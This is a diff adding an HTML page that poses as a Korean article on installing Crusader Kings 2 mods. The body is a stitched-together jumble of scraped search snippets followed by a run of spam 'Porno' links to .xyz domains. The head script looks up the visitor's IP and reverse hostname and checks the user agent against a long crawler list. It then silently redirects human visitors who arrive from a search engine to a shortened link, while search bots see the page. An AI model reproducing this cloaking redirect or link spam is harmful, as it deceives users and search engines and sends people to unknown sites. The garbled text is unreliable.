@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>9505</title>
+</script>
+</head>
+<body>
+<h1>크루세이더 킹즈2 모드 적용</h1>
+<p>Oct 19, 2019 — 크루세이더 킹즈2 추천 모드들을 정리해봤는데 기본적으로 크루세이더 킹즈2가 너무 오래된 게임이기 때문에 업데이트가 되면 대응이 매우 느리다 ...Apr 28, 2023 — 크루세이더 킹즈 2는 유저 모드를 지원한다. 게임 내 각종 시스템 수치를 변경하는 것에서 부터 지도를 바꾸거나 이벤트를 추가하는 등 다양한 수정이 ...Jan 18, 2022 — 크루세이더 킹즈 · 1 . 런처를 켜서 모드도구를 켜고, 생성하고 싶은 이름으로 모드를 등록시킨다 · 2 . 내문서Paradox InteractiveCrusader Kings III ...크루세이더 킹즈 2 초보자 입문가이드 실전압축공략 0 시작하기에 앞서 · 크루세이더 킹즈2 왕좌의 게임 모드 존 스노우로 살아남기 1 · 크루세이더 블레이드 고구려 장수왕 ...Nov 21, 2020 — 재생 플레이어 같은거는 내문 크킹 모드 폴더에 집어 넣는거는 알겠는데 나머지 스샷에 있는거는 어디다가 넣어야 해?Jan 13, 2017 — 모드 이름. 제작자. 소개. 대응 버젼. 철인. CK2 한글화. DrawnA. 크루세이더 킹즈2 한글화. 2.7.x. △. [CK2+] cultures · (생성인물이름). 아세영.Oct 12, 2020 — 디버그 모드를 F11을 눌러 껐다 켰다가 가능하게 해주는 모드입니다. 구독누르지마시고 위에 주소를 그대로 복사합니다. 2. http:// ...5 days ago — txt 를 만들고 그 에 압축을 푼 뒤, 크킹2를 실행하고 모드 모드수동적용방법(반복돌,레즈마르용) - 크루세이더 킹즈 장항선 열차 시간표 까막 - 크킹3 + ...6 days ago — 모드 적용하는 법좀 - 크루세이더 킹즈 마이너 갤러리 크루세이더 킹즈2 프로빈스 문화, 종교 변환 모드 - Flat Sun 크킹3의 내정과 마블 2의 전투를 ...오늘은 크루세이더 킹즈3와 마운틴 블레이드 2를 합친 모드를 다운로드 하고 실행 ... 2020년 6월 2일자 일본산 멀티바이트 패치 뒤 제국 왕국 한글 모드 적용 가능.《크루세이더 킹즈 2》(Crusader Kings II)는 중세를 배경으로 하는 대전략 게임의 하나로, 패러독스 개발 스튜디오가 개발하고 패러독스 인터랙티브가 배급하였다.7 hours ago — 크루 세이더 킹즈 2 한글 10 apr. 2020 — 1. 스팀 라이브러리에서 '창작마당' 탭을 클릭하세요. · 2. 'korean'을 키워드로 한글 모드를 검색합니다.7 hours ago — 크킹 오픈 때부터 구독하던 모드들이라 버전에 따라서 적용 …20 feb. 2022 — 1. ... [크루세이더 킹즈2 왕좌의 게임 모드] 존 스노우로 살아남기!5 hours ago — * 크킹 오픈 때부터 구독하던 모드들이라 버전에 따라서 적용 …2 mar. 2022 — 삼탈워 외모 모드는 써보고 진짜 만족했었는데 크킹3는 여자들이 아름다운 ...8 hours ago — 크루세이더 킹즈2 Sketchy Cheat Menu 치트 모드 – Flat Sun 크루 ... 붙여넣은 후 괄호안에만 채우시면 적용 됩니다.14 15:40:44 크루세이더 킹즈 3 ...8 hours ago — 크루세이더 킹즈 3가 게임패스에 포함되어 있기에, 단돈 1000원 …2 oct. ... 모드 파일 그 자체)를 풀면 런처가 인식을 해서 적용이 가능합니다.또 22년 2월에는 로열 코트 dlc가, 같은 해 6월에서는 Aug 7, 2021 크루세이더 킹즈 3 모드 한글화 모음집입니다. 공지사항 - 이 모드는 순수한 번역 패치 일 뿐 호환 ...샤르띠에입니다 크루세이더 킹즈3 (크킹3) 가 한국 시간 2022년 2월 8일에 15버전 ... 내기때문에사실상 모드질이 필수이자 재미요소라고 할 수 있는데이번에 크킹3 ...Requires Elder Kings 2. If this mod's version number doesn't match Elder Kings', then this mod is out of date and will probably not work without breaking UI ...유혹 크루세이더 킹즈 필수 dlcjs 크루세이더 킹즈 필수 dlcjs 고전 영화 노컷영화 ... +40% (2) 전투력 교육 특성은 모든 케릭에게 무조건 크루세이더 킹즈 3 모드 ...중요함( 크킹2 고양이 dlckdnjs tyler360.nl 크킹2 고양이 dlckdnjs . ... 못쓰는 ·크루세이더 킹즈2 추천 모드들을 정리해봤는데 기본적으로 크루세이더 킹즈2가 너무 ...16 hours ago — 마블 공식 카페에 한글화 파일 적용하시면 정상적으로 로그 다 뜹니다. ... 오늘은 크루세이더 킹즈3와 마운틴 블레이드 2를 합친 모드를 다운로드 ...1 hour ago — 파이널 판타지 7 2012 리메이크 모드 적용 판. 기타 릭 5 다운. … 더포레스트 1 0 한글패치.acum 10 ore — 크루세이더 킹즈 2 모드 설치법.8 hours ago — 2020 — 이번 포스팅에서는 손쉽게 적용하는 스팀의 창작마당(워크샵) 다운로드 ... 크루세이더 킹즈2 Better Looking Garbs 포트레잇 변경 모드 Steam ...16 hours ago — M&amp;T 3.0 메죽 한글패치 &amp; 한글화 모드 안정화 버전 0.7.2 작성자. ... How Attributes Work · +2% …acum 14 ore — 크루세이더 킹즈2, 유로파 유니버셜 ...디시인사이드입니다 ·다운로드 [무설치 한글패치] 크루세이더 킹즈 2 v 2832 최신 ... 구독'을 누르면 모드가 추가 됨 크킹3 런처에서 아래와 같이 확인 할 수 있음 2 ...16 hours ago — Paradox Development Studio, makers of the Crusader Kings and Europa ... 다양한 모드에 대한 한글 패치가 존재하니 워크샵에서 검색 후 적용하면 ...5 hours ago — 하츠오브아이언4 갤러리 Hearts of Iron은 2차대전 전략 시뮬레이션 게임 ... 4를 비롯한 역설사 게임(크루세이더 킹즈, 하츠오브아이언, 스텔라리스, ...18 hours ago — 개요2. 심즈4 All Dlc 무설치 반복돌 확장팩 복돌 적용법 네이버 검색창에 ... 크루세이더 킹즈 dlc 복돌 마인크래프트 심즈4 all dlc 설치 – 심즈4 ...4 hours ago — 크루세이더 킹즈 2 모드추천. 노트북녀1-4.마인크래프트 명령어, 치트키 총정리 – 0024 – 티스토리 게임모드 평화로움: peaceful ( 0 또는 p ) ...6 hours ago — 크루세이더 킹즈2 3 0 1 1. 니어 오토마타 nier automata 0 3 ... 마인 크래프트 1 5 2 프리 루트 통합 모드 v3. ... Centos 7 hostname 변경 적용.6 hours ago — 크루세이더 킹즈 2 문장. ... 세계 2 차 대전. 마인크래프트 1 7 10 모드버킷 모드 적용. ... 한양대 일반화학및실험 2 중간고사 기출문제.<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
